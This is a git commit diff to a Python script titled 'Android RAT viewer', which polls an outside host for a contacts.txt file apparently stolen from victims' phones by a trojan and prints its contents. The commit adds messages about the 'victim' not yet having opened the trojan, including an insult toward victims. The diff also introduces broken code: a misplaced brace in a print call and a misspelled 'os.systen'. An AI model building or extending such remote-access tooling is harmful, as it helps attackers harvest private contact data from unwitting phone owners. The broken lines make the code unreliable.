a6225801b9a4a328e546eef543a1b988ad9468ea
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2026-06-20 03:14:40 -0500

    Modify output messages in Android RAT viewer
    Updated messages and added a check for victim access.

--- tools/ar.py
+++ tools/ar.py
@@ -6,9 +6,9 @@ GREEN = "\033[32m"
 BLUE = "\033[34m"
 RESET = "\033[0m"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
-print("Coded by Nihility")
-print("Android RAT viewer.")
-print(f"{RED}Waiting for contacts.txt to have content...{RESET}")
+print(f"{BLUE}Coded by Nihility"{RESET})
+print(f"{RED}Android RAT viewer.{RESET}")
+print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
 time.sleep(1)
 while True:
     try:
@@ -16,13 +16,15 @@ while True:
         if response.status_code == 200:
             content = response.text.strip()
             if content:
-                os.system('cls')
+                os.system('clear')
                 print(f"{GREEN}RAT got access. Proceeding...{RESET}")
                 print(f"{GREEN}Content:\n {content} {RESET}")
                 input("Press Enter to exit.")
                 break
             else:
-                print("File is empty, waiting...")
+                os.systen('clear')
+                print(f"{RED}Dumbass has yet to open the trojan, waiting...{RESET}")
+                
         else:
             print(f"Received status code {response.status_code}")
     except Exception as e:
